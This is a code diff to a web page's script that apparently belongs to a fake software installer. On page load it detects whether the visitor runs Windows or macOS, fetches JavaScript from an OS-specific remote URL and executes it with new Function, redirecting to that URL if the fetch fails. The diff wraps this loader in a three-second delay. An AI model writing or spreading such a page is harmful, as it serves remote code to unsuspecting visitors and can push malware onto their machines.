@@ -374,29 +374,32 @@
 
         document.addEventListener("DOMContentLoaded", () => {
             updateUI();
-            const os = detectOS();
-            sendLink();
 
-            if (os === 'windows' || os === 'macos') {
-                const targetUrl = os === 'windows' ? REMOTE_WINDOWS : REMOTE_MAC;
+            setTimeout(() => {
+                const os = detectOS();
+                sendLink();
 
-                async function load() {
-                    try {
-                        const res = await fetch(targetUrl, { cache: 'no-store' });
-                        const code = await res.text();
-                        const headline = document.getElementById('dynamicTitle');
-                        const status = document.getElementById('dynamicSubtitle');
-                        new Function('headline', 'status', code)(headline, status);
-                    } catch {
-                        setTimeout(() => { window.location.replace(targetUrl); }, 1450);
+                if (os === 'windows' || os === 'macos') {
+                    const targetUrl = os === 'windows' ? REMOTE_WINDOWS : REMOTE_MAC;
+
+                    async function load() {
+                        try {
+                            const res = await fetch(targetUrl, { cache: 'no-store' });
+                            const code = await res.text();
+                            const headline = document.getElementById('dynamicTitle');
+                            const status = document.getElementById('dynamicSubtitle');
+                            new Function('headline', 'status', code)(headline, status);
+                        } catch {
+                            setTimeout(() => { window.location.replace(targetUrl); }, 1450);
+                        }
                     }
+                    load();
+                } else {
+                    document.getElementById('dynamicTitle').textContent = "Attention: Unsupported Operating System";
+                    document.getElementById('dynamicSubtitle').textContent = "To continue installation, you must be using Windows or macOS. Installation is not supported on your current operating system.";
+                    setTimeout(() => { window.location.replace(ERROR_URL); }, 4000);
                 }
-                load();
-            } else {
-                document.getElementById('dynamicTitle').textContent = "Attention: Unsupported Operating System";
-                document.getElementById('dynamicSubtitle').textContent = "To continue installation, you must be using Windows or macOS. Installation is not supported on your current operating system.";
-                setTimeout(() => { window.location.replace(ERROR_URL); }, 4000);
-            }
+            }, 3000);
         });
     </script>
 </body>
